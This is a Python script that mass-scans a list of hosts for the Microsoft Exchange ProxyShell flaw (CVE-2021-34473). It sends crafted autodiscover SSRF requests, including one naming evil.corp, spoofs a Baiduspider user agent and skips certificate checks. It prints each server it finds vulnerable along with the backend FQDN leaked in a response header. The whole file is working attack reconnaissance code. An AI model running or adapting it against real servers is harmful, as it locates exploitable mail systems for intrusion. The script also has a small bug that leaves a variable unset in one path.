import re
import urllib3
import requests,sys
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings()


headers = {
    'Accept-Language':'cn-CN,cn;q=0.5',
    'User-Agent':'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'
}


def proxyshell_check(url):
    url = url.strip()
    payload = "/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com"
    payload2 = "/autodiscover/autodiscover.json?@evil.corp/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp"
    
    try:
        with requests.get("https://{url}{payload}".format(url=url, payload=payload), allow_redirects=True, timeout=20, verify=False, headers=headers) as response:           
            if response.status_code == 500:         
                
                with requests.get("https://{url}{payload}".format(url=url, payload=payload2), verify=False, timeout=5, headers=headers) as response:
            
                    try:
            
                        fqdn = response.headers["X-CalculatedBETarget"]
            
                    except Exception as e:
                        pass
                    
                    print("[+] CVE-2021-34473 Vulnerable", url, "FQDN:",fqdn)

    except Exception as e:
        pass


def thread(thread, file):
    with ThreadPoolExecutor(thread) as executor:
        with open(file, "r") as file:
            futures = []


            for url in file:
                futures.append(executor.submit(proxyshell_check, url))
            
            if len(futures) >= thread:
                try:
                    for future in as_completed(futures, timeout=30):

                        if future.result() is not None:
                            print(future.result())
                        futures.remove(future)
                except:
                    pass


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='')
    parser.add_argument("--thread", dest="thread", default=10, type=int)
    parser.add_argument("--file", dest="file", required=True)
    args = parser.parse_args()

    try:
        thread(args.thread, args.file)
    except KeyboardInterrupt:
        print("Exit...")
